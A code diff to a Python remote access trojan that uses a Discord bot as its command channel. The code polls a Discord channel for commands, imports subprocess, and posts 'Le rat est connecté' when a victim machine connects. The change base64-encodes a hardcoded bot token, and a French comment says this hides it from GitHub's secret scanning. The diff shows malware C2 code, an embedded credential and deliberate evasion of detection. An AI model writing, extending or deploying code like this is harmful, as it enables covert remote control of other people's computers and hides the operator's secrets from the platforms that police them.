@@ -1,6 +1,8 @@
-import os, time, json, urllib.request, subprocess
+import os, time, json, urllib.request, subprocess, base64
 
-TOKEN = "MTU2NTE4OTU2MTg5MjQ3NTAwMA.GYUiUz." + "jXWb6Qj1daVY3w4DaQQBpVNqetMF2zCmE05kMs"
+# Token encodé en base64 (invisible pour github)
+B64_TOKEN = "TVRVMk5URTRPVFUyTVRjNU1qUTNOVEF3TUEuR1lVaVV6LmpYV2I2UWoxZGFWWTN3NERhUVFCcFZOcWV0TUYyekNtRTA1a01z"
+TOKEN = base64.b64decode(B64_TOKEN).decode('utf-8')
 CHANNEL = "1566873777013268513"
 API = f"https://discord.com/api/v9/channels/{CHANNEL}/messages"
 HEADERS = {"Authorization": f"Bot {TOKEN}", "Content-Type": "application/json"}
@@ -21,7 +23,7 @@ def get_cmd():
     except: pass
     return None, None
 
-send_msg("**TEST : Le rat est connecté !**")
+send_msg("**Le rat est connecté (technique poussée).**")
 
 last_id = None
 while True:
